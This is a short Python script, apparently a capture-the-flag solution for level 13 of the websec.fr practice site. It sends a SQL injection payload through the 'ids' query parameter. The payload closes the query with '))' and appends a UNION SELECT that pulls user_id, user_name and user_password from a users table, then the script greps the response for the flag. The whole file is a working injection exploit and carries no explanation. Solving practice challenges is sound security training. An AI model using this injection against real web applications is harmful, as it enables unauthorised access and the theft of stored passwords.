#!/usr/bin/env python3
import requests
import re

URL = "https://websec.fr/level13/index.php"
obj = {
    'ids': '1,0,0,0,0))UNION SELECT user_id,user_name,user_password from users/*',
    'submit': 'Go'
}

res = requests.get(f"{URL}",params=obj)
flag = re.findall(r'WEBSEC\{[^}]+\}', res.text)
print(flag)